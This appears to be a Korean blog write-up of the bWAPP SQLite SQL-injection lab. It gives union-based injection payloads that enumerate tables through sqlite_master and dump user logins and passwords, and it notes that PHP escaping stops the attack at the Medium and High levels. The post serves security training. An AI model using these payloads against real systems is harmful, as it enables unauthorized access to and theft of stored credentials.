---
layout: single
title: (bWAPP)SQL Injection (SQLite)
categories: Web-vuln
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/image.png)

- '(싱글 쿼터) 입력시 Error 발생
- DBMS 의 종류가 SQLite 이다.
- union Based 로 방향을 잡았으며, 이전의 DBMS 들과의 문법이 상이하다.

> information_schema 와 같은 메타데이터 사전을 sqlite_master 라는 파일 하나로 전부 관리한다.

1. sqlite_version()	버전(@@version)
2. tbl_name		테이블 이름
3. sql 			컬럼 정보(column_name)

```sql
'order by 6--
```

- 동일하게 컬럼 개수를 파악

```sql
'and 1=2 union select 1,2,3,4,5,6--
```

- 페이지상에 출력되는 컬럼들을 파악했다.

![그림 1-2](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/image2.png)

- 2,3,5,4 컬럼이 노출되고 있다.

```sql
'union+select+1,2,name,4,5,6 from sqlite_master--+-
```

![그림 1-3](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/image3.png)
- 테이블 명들을 확인할 수 있다.

```sql
'and 1=2 union select 1,sql,3,4,5,6 from sqlite_master where tbl_name='users'--
```

![그림 1-4](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/imag4.png)

- 컬럼명을 추출할 수 있다.

```sql
' and 1=2 union select 1,id,login,secret,password,6 from users--
```

![그림 1-5](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/image4.png)

- 성공적으로 데이터를 추출할 수 있다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.

